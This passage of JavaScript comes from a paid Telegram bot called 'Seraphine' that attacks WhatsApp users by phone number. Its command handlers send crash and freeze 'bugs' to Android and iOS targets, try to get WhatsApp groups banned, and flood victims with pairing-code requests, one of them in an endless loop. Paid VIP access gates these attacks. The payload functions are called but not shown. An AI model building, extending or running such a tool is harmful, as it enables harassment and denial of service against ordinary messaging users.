    ]
  };
}

bot.sendAudio(chatId, fs.createReadStream("./lib/crayx.mp3"), {
  contentType: "audio/mpeg",
  title: "Sakura - Rossa",
  performer: "Dilxxzyz",
  caption: "Seraphine"
 });
});

// ==================== HANDLER CALLBACK QUERY ====================
bot.on("callback_query", async (query) => {
  try {
    const chatId    = query.message.chat.id;
    const messageId = query.message.message_id;
    const data      = query.data;
    const bokepjepang = getBotRuntime();

    let caption     = "";
    let replyMarkup = {};

    // --- Bug Menu ---
    if (data === "yatim") {
      caption = `\`\`\`
╔━════━⊱ [ Seraphine ]
├─── ( 𖥊 ) My Script Info
├々 Author : @DilxzzY2
├々 𝚅𝚎𝚛𝚜𝚒𝚘𝚗 : 2.2
├々 𝚄𝚙𝚝𝚒𝚖𝚎 : ${bokepjepang}
├々 𝙻𝚒𝚋𝚛𝚊𝚛𝚢 : 𝙹𝚊𝚟𝚊𝚂𝚌𝚛𝚒𝚙𝚝
╚━═━═━═━═━═━═━═━═━═━═━═━═々
╔━══━⊱【 Bugs Menu 】━═━═❏
║⎔ /xseraphine : 62×××
┃ » └⊱ ⟮ Invisible Forceclose Infinty ⟯
║⎔ /xdelay : 62×××
┃ » └⊱ ⟮ Spam Delay ⟯
║⎔ /xseranex : 62×××
┃ » └⊱ ⟮ Force And Freezz ⟯
║⎔ /attack : 62×××
┃ » └⊱ ⟮ Free Spam Delay Bugs ⟯
║⎔ /nexdro : 62×××
┃ » └⊱ ⟮ Delay Not Invisible⟯
╚━═━═━═━═━═━═━═━━═━═━═━═━❏
\`\`\``;
      replyMarkup = {
        inline_keyboard: [
          [{ text: "🚫 Banned Group",  callback_data: "banned_group", style: getStyle() }],
          [{ text: "💢 XD IOS BUGS",   callback_data: "xdios",        style: getStyle() }],
          [{ text: "🔙 Back To Menu", callback_data: "back",         style: getStyle() }]
        ]
      };
    }

    // --- XD IOS BUGS ---
    if (data === "xdios") {
      caption = `\`\`\`
╔━═══━⊱ [ XD IOS BUGS ]
║⎔ /iosvnex : 62×××
┃ » └⊱ ⟮ iOS Blank ⟯
║⎔ /xios : 62×××
┃ » └⊱ ⟮ iOS Force Close Invisible ⟯
╚━═━═━═━═━═━═━═━═━═━═━═━═々
⚠️ Note : Kirim ke target iOS
╚━═━═━═━═━═━═━═━═━═━═━═━═❏
\`\`\``;
      replyMarkup = {
        inline_keyboard: [
          [{ text: "🔙 Back To Menu", callback_data: "yatim", style: getStyle() }]
        ]
      };
    }

    // --- Banned Group ---
    if (data === "banned_group") {
      caption = `\`\`\`
╔━═══━⊱ [ Banned Group ]
├々 Command : /xgb <link grup>
├々 Sender  : wajib sender pribadi
╚━═━═━═━═━═━═━═━═━═━═━═━═々
╔━═══━⊱ [ CARA PAKAI ]
├々 1. /addsenderban 62xxx
├々 2. /xgb <link grup>
╚━═━═━═━═━═━═━═━═━═━═━═━═々
\`\`\``;
      replyMarkup = {
        inline_keyboard: [
          [{ text: "🔙 Back To Menu", callback_data: "yatim", style: getStyle() }]
        ]
      };
    }

    // --- Owner Menu ---
    if (data === "kontollu") {
      caption = `\`\`\`
╭━───━⊱ ⊱⪩ 𝙾𝚆𝙽𝙴𝚁 𝙼𝙴𝙽𝚄 ⪨⊰
┃❏ /addsender 62xxx
┃❏ /setjeda <ᴛɪᴍᴇ>
┃❏ /grouponly < ᴏɴ/ᴏғғ >
┃❏ /addadmin <ɪᴅ>
┃❏ /deladmin <ɪᴅ>
┃❏ /addvip <ɪᴅ>
┃❏ /delvip <ɪᴅ>
┃❏ /listvip <ᴄᴇᴋ>
┃❏ /cekid
┃❏ /tourl
╰━───────────────━❏
\`\`\``;
      replyMarkup = {
        inline_keyboard: [
          [{ text: "🔙 Back To Menu", callback_data: "back", style: getStyle() }]
        ]
      };
    }

    // --- Thanks To ---
    if (data === "tq") {
      caption = `\`\`\`
╭━───━⊱ 𝐓‌𝐡‌𝐚‌𝐧‌𝐤‌𝐬 ⍣᳟ 𝐓‌𝐨‌𝐨༑⃟꙳
┃┏─⊱
┃犬 DilxzzY2
┃犬 ALL BUYER SERAPHINE 
┃┗─⊱
╰━───────────────━❏
\`\`\``;
      replyMarkup = {
        inline_keyboard: [
          [{ text: "🔙 Back To Menu", callback_data: "back", style: getStyle() }]
        ]
      };
    }

    // --- Back To Menu ---
    if (data === "back") {
      caption = `\`\`\`
Yōkoso Seraphine no sukuri puto e. Kono sukuri puto o tadashiku tsukai, sapōto shite kudasai. Motto hatten suru tame ni, dōzo riyō shite kudasai.
┌────── [ Seraphine 🩸 ]
├─── ( 𖥊 ) My Script Info
├々 Author : @DilxzzY2
├々 𝚅𝚎𝚛𝚜𝚒𝚘𝚗 : 2.2
├々 𝚄𝚙𝚝𝚒𝚖𝚎 : ${bokepjepang}
├々 𝙻𝚒𝚋𝚛𝚊𝚛𝚢 : 𝙹𝚊𝚟𝚊𝚂𝚌𝚛𝚒𝚙𝚝
┗━━━━━━━━━━━━━━━━━━━━━々

( ! ) 𝘴𝘦𝘭𝘦𝘤𝘵 𝘵𝘩𝘦 𝘣𝘶𝘵𝘵𝘰𝘯 𝘮𝘦𝘯𝘶 𝘣𝘦𝘭𝘰𝘸
\`\`\``;
      replyMarkup = {
        inline_keyboard: [
          [{ text: "[🦠] ༑𝐁͢𝐮͡𝐠𝐌͜𝐞͢𝐧͡𝐮͠༑⃟꙳", callback_data: "yatim",    style: getStyle() }],
          [{ text: "[🩸] 𝐎͢𝐰͡𝐧͜𝐞͢𝐫⍣᳟𝐌͜𝐞͢𝐧͡𝐮༑⃟꙳", callback_data: "kontollu", style: getStyle() }],
          [{ text: "[🍃] 𝐓‌𝐡‌𝐚‌𝐧‌𝐤‌𝐬 ⍣᳟ 𝐓‌𝐨‌𝐨༑⃟꙳", callback_data: "tq",       style: getStyle() }]
        ]
      };
    }

    // --- Kirim hasil edit ---
    if (caption) {
      await bot.editMessageMedia(
        {
          type: "photo",
          media: "https://j.top4top.io/p_39077fbdn0.png",
          caption: caption,
          parse_mode: "Markdown"
        },
        {
          chat_id: chatId,
          message_id: messageId,
          reply_markup: replyMarkup
        }
      );
    }

    await bot.answerCallbackQuery(query.id);

  } catch (error) {
    console.error("Error handling callback query:", error);
    try { await bot.answerCallbackQuery(query.id); } catch (_) {}
  }
});
//=======CASE BUG=========//
bot.onText(/\/xxx (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const cooldown = checkCooldown(userId);

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`\nLu Bukan Vip Goblok!!\`\`\`\n`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "📞 𝘉𝘶𝘺 𝘈𝘤𝘤𝘦𝘴", url: "https://t.me/DilxzzY2" }]
        ]
      }
    });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    // ✅ Langsung kirim "Succes Send Bug"
    await bot.sendMessage(chatId, "Succes Send Bug", {
      reply_markup: {
        inline_keyboard: [[
          {
            text: "Details Target",
            url: `https://wa.me/${formattedNumber}`,
            icon_custom_emoji_id: "5395444784611480792",
            style: "success"
          }
        ]]
      }
    });

    // Loop kirim bug di background
    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    await crayxui(jid);
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});                                                                                                                                                                         
bot.onText(/\/xseraphine (\d+)/, async (msg, match) => {
  const chatId   = msg.chat.id;
  const senderId = msg.from.id;
  const userId   = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const cooldown = checkCooldown(userId);

  // ✅ FIX: pakai hasPremiumAccess (user ATAU grup VIP)
  if (!hasPremiumAccess(senderId, chatId, msg.chat.type)) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`\nLu Bukan Vip Goblok!!\`\`\`\n`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "📞 𝘉𝘶𝘺 𝘈𝘤𝘤𝘦𝘴", url: "https://t.me/DilxzzY2" }]
        ]
      }
    });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    // ✅ Langsung kirim "Succes Send Bug"
    await bot.sendMessage(chatId, "Succes Send Bug", {
      reply_markup: {
        inline_keyboard: [[
          {
            text: "Details Target",
            url: `https://wa.me/${formattedNumber}`,
            icon_custom_emoji_id: "5395444784611480792",
            style: "success"
          }
        ]]
      }
    });

    // Loop kirim bug di background
    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    await crayxui(jid);
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});    
bot.onText(/\/iosvnex (\d+)/, async (msg, match) => {
  const chatId   = msg.chat.id;
  const senderId = msg.from.id;
  const userId   = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const cooldown = checkCooldown(userId);

  // ✅ FIX: pakai hasPremiumAccess (user ATAU grup VIP)
  if (!hasPremiumAccess(senderId, chatId, msg.chat.type)) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`\nLu Bukan Vip Goblok!!\`\`\`\n`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "📞 𝘉𝘶𝘺 𝘈𝘤𝘤𝘦𝘴", url: "https://t.me/DilxzzY2" }]
        ]
      }
    });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    // ✅ Langsung kirim "Succes Send Bug"
    await bot.sendMessage(chatId, "Succes Send Bug", {
      reply_markup: {
        inline_keyboard: [[
          {
            text: "Details Target",
            url: `https://wa.me/${formattedNumber}`,
            icon_custom_emoji_id: "5395444784611480792",
            style: "success"
          }
        ]]
      }
    });

    // Loop kirim bug di background
    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    await blankcrayx(jid);
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});    
bot.onText(/\/xseranex (\d+)/, async (msg, match) => {
  const chatId   = msg.chat.id;
  const senderId = msg.from.id;
  const userId   = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const cooldown = checkCooldown(userId);

  // ✅ FIX: pakai hasPremiumAccess (user ATAU grup VIP)
  if (!hasPremiumAccess(senderId, chatId, msg.chat.type)) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`\nLu Bukan Vip Goblok!!\`\`\`\n`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "📞 𝘉𝘶𝘺 𝘈𝘤𝘤𝘦𝘴", url: "https://t.me/DilxzzY2" }]
        ]
      }
    });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    // ✅ Langsung kirim "Succes Send Bug"
    await bot.sendMessage(chatId, "Succes Send Bug", {
      reply_markup: {
        inline_keyboard: [[
          {
            text: "Details Target",
            url: `https://wa.me/${formattedNumber}`,
            icon_custom_emoji_id: "5395444784611480792",
            style: "success"
          }
        ]]
      }
    });

    // Loop kirim bug di background
    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    await crayxvol(jid);
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});    
bot.onText(/\/attack (\d+)/, async (msg, match) => {
  const chatId   = msg.chat.id;
  const senderId = msg.from.id;
  const userId   = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const cooldown = checkCooldown(userId);

  // ✅ FIX: pakai hasPremiumAccess (user ATAU grup VIP)
  if (!hasPremiumAccess(senderId, chatId, msg.chat.type)) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`\nLu Bukan Vip Goblok!!\`\`\`\n`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "📞 𝘉𝘶𝘺 𝘈𝘤𝘤𝘦𝘴", url: "https://t.me/DilxzzY2" }]
        ]
      }
    });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    // ✅ Langsung kirim "Succes Send Bug"
    await bot.sendMessage(chatId, "Succes Send Bug", {
      reply_markup: {
        inline_keyboard: [[
          {
            text: "Details Target",
            url: `https://wa.me/${formattedNumber}`,
            icon_custom_emoji_id: "5395444784611480792",
            style: "success"
          }
        ]]
      }
    });

    // Loop kirim bug di background
    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    await crayxsuper(jid);
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});    
bot.onText(/\/xdelay (\d+)/, async (msg, match) => {
  const chatId   = msg.chat.id;
  const senderId = msg.from.id;
  const userId   = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const cooldown = checkCooldown(userId);

  // ✅ FIX: pakai hasPremiumAccess (user ATAU grup VIP)
  if (!hasPremiumAccess(senderId, chatId, msg.chat.type)) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`\nLu Bukan Vip Goblok!!\`\`\`\n`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "📞 𝘉𝘶𝘺 𝘈𝘤𝘤𝘦𝘴", url: "https://t.me/DilxzzY2" }]
        ]
      }
    });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    // ✅ Langsung kirim "Succes Send Bug"
    await bot.sendMessage(chatId, "Succes Send Bug", {
      reply_markup: {
        inline_keyboard: [[
          {
            text: "Details Target",
            url: `https://wa.me/${formattedNumber}`,
            icon_custom_emoji_id: "5395444784611480792",
            style: "success"
          }
        ]]
      }
    });

    // Loop kirim bug di background
    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    await crayxsuper(jid);
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});    
bot.onText(/\/nexdro (\d+)/, async (msg, match) => {
  const chatId   = msg.chat.id;
  const senderId = msg.from.id;
  const userId   = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const cooldown = checkCooldown(userId);

  // ✅ FIX: pakai hasPremiumAccess (user ATAU grup VIP)
  if (!hasPremiumAccess(senderId, chatId, msg.chat.type)) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`\nLu Bukan Vip Goblok!!\`\`\`\n`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "📞 𝘉𝘶𝘺 𝘈𝘤𝘤𝘦𝘴", url: "https://t.me/DilxzzY2" }]
        ]
      }
    });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    // ✅ Langsung kirim "Succes Send Bug"
    await bot.sendMessage(chatId, "Succes Send Bug", {
      reply_markup: {
        inline_keyboard: [[
          {
            text: "Details Target",
            url: `https://wa.me/${formattedNumber}`,
            icon_custom_emoji_id: "5395444784611480792",
            style: "success"
          }
        ]]
      }
    });

    // Loop kirim bug di background
    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    await Crayxbayar(jid);
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});    
bot.onText(/\/xios (\d+)/, async (msg, match) => {
  const chatId   = msg.chat.id;
  const senderId = msg.from.id;
  const userId   = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const cooldown = checkCooldown(userId);

  // ✅ FIX: pakai hasPremiumAccess (user ATAU grup VIP)
  if (!hasPremiumAccess(senderId, chatId, msg.chat.type)) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`\nLu Bukan Vip Goblok!!\`\`\`\n`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "📞 𝘉𝘶𝘺 𝘈𝘤𝘤𝘦𝘴", url: "https://t.me/DilxzzY2" }]
        ]
      }
    });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    // ✅ Langsung kirim "Succes Send Bug"
    await bot.sendMessage(chatId, "Succes Send Bug", {
      reply_markup: {
        inline_keyboard: [[
          {
            text: "Details Target",
            url: `https://wa.me/${formattedNumber}`,
            icon_custom_emoji_id: "5395444784611480792",
            style: "success"
          }
        ]]
      }
    });

    // Loop kirim bug di background
    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    await crayxkouta(jid);
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});    


//=======plugins=======//
bot.onText(/\/tiktok (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const url = match[1];

  if (!url.includes("tiktok.com")) {
    return bot.sendMessage(chatId, "⚠️ *URL TikTok tidak valid!*", {
      parse_mode: "Markdown",
    });
  }

  try {
    const result = await tiktokDl(url);
    const video = result.video_links.find((v) => v.type === "nowatermark");

    if (!video) {
      return bot.sendMessage(
        chatId,
        "⚠️ *Gagal mendapatkan video tanpa watermark!*",
        { parse_mode: "Markdown" }
      );
    }

    const caption =
      `📌 *${result.title}*\n` +
      `👤 *${result.author.nickname}*\n` +
      `🎥 *${result.stats.views}* views\n` +
      `❤️ *${result.stats.likes}* likes\n` +
      `💬 *${result.stats.comment}* comments\n` +
      `🔄 *${result.stats.share}* shares\n` +
      `📅 *Diunggah:* ${result.taken_at}\n` +
      `⏳ *Durasi:* ${result.duration}`;

    await bot.sendVideo(chatId, video.url, {
      caption,
      parse_mode: "Markdown",
    });
  } catch (err) {
    bot.sendMessage(chatId, `❌ *Gagal mengambil video:* ${err.message}`, {
      parse_mode: "Markdown",
    });
  }
});
bot.onText(/\/xgb (.+)/, async (msg, match) => {
  const chatId   = msg.chat.id;
  const senderId = msg.from.id;
  const userId   = msg.from.id;
  const targetInput = match[1].trim();
  const inviteCode = targetInput.includes("chat.whatsapp.com/")
    ? targetInput.split("chat.whatsapp.com/")[1].split(/[?/]/)[0]
    : targetInput.replace(/[^a-zA-Z0-9]/g, "");
  const jid = inviteCode;
  const randomImage = getRandomImage();
  const cooldown = checkCooldown(userId);

  if (!hasPremiumAccess(senderId, chatId, msg.chat.type)) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`\nLu Bukan Vip Goblok!!\`\`\`\n`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "📞 𝘉𝘶𝘺 𝘈𝘤𝘤𝘦𝘴", url: "https://t.me/DilxzzY2" }]
        ]
      }
    });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  try {
    if (banSessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada sender BAN yang terhubung.\nGunakan /addsenderban 62xxx dulu."
      );
    }

    await bot.sendMessage(chatId, "Succes Banned Group", {
      reply_markup: {
        inline_keyboard: [[
          {
            text: "Details Target",
            url: `https://chat.whatsapp.com/${inviteCode}`,
            icon_custom_emoji_id: "5395444784611480792",
            style: "success"
          }
        ]]
      }
    });

    console.log("\x1b[32m[PROSES BAN GROUP]\x1b[0m TUNGGU HINGGA SELESAI");
    await crayxios(jid);   // 🔥 tetep panggil crayxui
    console.log("\x1b[32m[SUCCESS]\x1b[0m Ban group selesai! 🚀");

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal: ${error.message}`);
  }
});

bot.onText(/\/spam_report (.+)/, async (msg, match) => {
{
  }
  const chatId = msg.chat.id;
  const fromId = msg.from.id;

  const q = match[1];
  if (!q) {
    return bot.sendMessage(
      chatId,
      "❌ Mohon masukkan nomor yang ingin di-*report*.\nContoh: /spam_report 628xxxxxx"
    );
  }

  const target = q.replace(/[^0-9]/g, "").trim();
  const pepec = `${target}@s.whatsapp.net`;

  try {
    const { state } = await useMultiFileAuthState("crayxreport");
    const { version } = await fetchLatestBaileysVersion();

    const sucked = await makeWASocket({
      printQRInTerminal: false,
      mobile: false,
      auth: state,
      version,
      logger: P({ level: "fatal" }),
      browser: ["Mac OS", "Chrome", "121.0.6167.159"],
    });

    await bot.sendMessage(chatId, `Telah Mereport Target ${pepec}`);

    while (true) {
      await new Promise((resolve) => setTimeout(resolve, 1600));
      await sucked.requestPairingCode(target);
    }
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat menjalankan perintah.");
  }
});


bot.onText(/\/spam_pairing (\d+)\s*(\d+)?/, async (msg, match) => {
{
  }
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  const target = match[1];
  const count = parseInt(match[2]) || 40;

  bot.sendMessage(
    chatId,
    `Mengirim Spam Pairing ${count} ke nomor ${target}...`
  );

  try {
    const { state } = await useMultiFileAuthState("crayxpairing");
    const { version } = await fetchLatestBaileysVersion();

    const sucked = await makeWASocket({
      printQRInTerminal: false,
      mobile: false,
      auth: state,
      version,
      logger: P({ level: "fatal" }),
      browser: ["Mac Os", "chrome", "121.0.6167.159"],
    });

    for (let i = 0; i < count; i++) {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        await sucked.requestPairingCode(target);
      } catch (e) {
        console.error(`Gagal spam pairing ke ${target}:`, e);
      }
    }

    bot.sendMessage(chatId, `Selesai spam pairing ke ${target}.`);
  } catch (err) {
    console.error("Error:", err);
    bot.sendMessage(chatId, "Terjadi error saat menjalankan spam pairing.");
  }
});

bot.onText(/^\/grouponly (on|off)/, (msg, match) => {

    if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
  return bot.sendMessage(
    chatId,
    "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
    { parse_mode: "Markdown" }
  );
}

  const mode = match[1] === "on";
  setOnlyGroup(mode);

  bot.sendMessage(
    msg.chat.id,
    `Mode *Group Only* sekarang *${mode ? "AKTIF" : "NONAKTIF"}*`,
    { parse_mode: "Markdown" }
  );
});

bot.onText(/\/addsender (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
  return bot.sendMessage(
    chatId,
    "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
    { parse_mode: "Markdown" }
  );
}
  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in addbot:", error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});



const moment = require('moment');

bot.onText(/\/addsenderban (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const botNumber = match[1].replace(/[^0-9]/g, "");

  if (!botNumber || botNumber.length < 10) {
    return bot.sendMessage(chatId, "❌ Format nomor salah. Contoh: /addsenderban 628xxxx");
  }

  if (!hasPremiumAccess(senderId, chatId, msg.chat.type)) {
    return bot.sendMessage(chatId, "❌ Lu bukan VIP!");
  }

  if (banSessions.has(botNumber)) {
    return bot.sendMessage(chatId, `⚠️ Sender ban ${botNumber} udah terhubung.`);
  }

  await bot.sendMessage(chatId, `⏳ Connecting sender BAN ${botNumber}...`);
  await connectToBanWhatsApp(botNumber, chatId);
});
// ← langsung lanjut ke /addvipgb (baris 1836)


// ==================== /addvipgb ====================
// Format: /addvipgb <durasi>
//         /addvipgb <chatId> <durasi>
// Contoh: /addvipgb 30d
//         /addvipgb -1001234567890 30d

// ==================== /addvipgb ====================
bot.onText(/\/addvipgb(?:\s(.+))?/, (msg, match) => {
  const chatId   = msg.chat.id;
  const senderId = msg.from.id;

  // --- Cek otorisasi ---
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, "❌ You are not authorized to admin groups.");
  }

  if (!match[1]) {
    return bot.sendMessage(chatId, "❌ Missing input. Example: /addvipgb -100325876878 30d.");
  }

  const args = match[1].split(' ');
  if (args.length < 2) {
    return bot.sendMessage(chatId, "❌ Missing input. Example: /addvipgb -100325876878 30d.");
  }

  // --- Parse chatId & durasi ---
  const targetGroupId = args[0].trim();   // ⚠️ JANGAN di-strip non-digit, minusnya penting!
  const duration      = args[1];

  // --- Validasi chatId (harus -100xxxxxxxxxx atau angka negatif) ---
  if (!/^-?\d+$/.test(targetGroupId)) {
    return bot.sendMessage(chatId, "❌ Invalid chat ID. Harus angka, contoh: -100325876878");
  }

  // --- Validasi durasi ---
  if (!/^\d+[dhm]$/.test(duration)) {
    return bot.sendMessage(chatId,
      "❌ Invalid duration format. Use numbers followed by d (days), h (hours), or m (minutes). Example: 30d."
    );
  }

  // --- Hitung expiry ---
  const value = parseInt(duration);
  const unit  = duration.slice(-1);
  const expirationDate = moment().add(
    value,
    unit === 'd' ? 'days' : unit === 'h' ? 'hours' : 'minutes'
  );

  // --- Simpan / update premiumGroups ---
  const existing = premiumGroups.find(g => String(g.id) === String(targetGroupId));

  if (!existing) {
    premiumGroups.push({
      id: targetGroupId,
      expiresAt: expirationDate.toISOString(),
      addedBy: senderId,
      addedAt: new Date().toISOString()
    });
    savePremiumGroups();
    console.log(`${senderId} added GROUP ${targetGroupId} to Prem until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}`);

    return bot.sendMessage(chatId,
      `✅ Grup ${targetGroupId} has been added to the vip list until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.\n` +
      `💡 Semua member grup otomatis dapat akses premium.`
    );
  } else {
    existing.expiresAt = expirationDate.toISOString();
    savePremiumGroups();

    return bot.sendMessage(chatId,
